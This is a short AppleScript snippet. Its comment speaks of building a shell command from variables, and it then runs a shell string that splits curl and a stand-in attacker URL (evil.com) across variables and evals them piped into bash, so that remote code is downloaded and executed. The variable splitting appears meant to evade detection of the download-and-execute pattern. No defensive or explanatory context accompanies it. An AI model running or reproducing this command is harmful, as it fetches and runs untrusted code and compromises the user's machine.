-- Set variables in shell to build the final command
set cmd to "a=curl; b='-s http://evil.com'; eval \"$a $b | bash\""
do shell script cmd
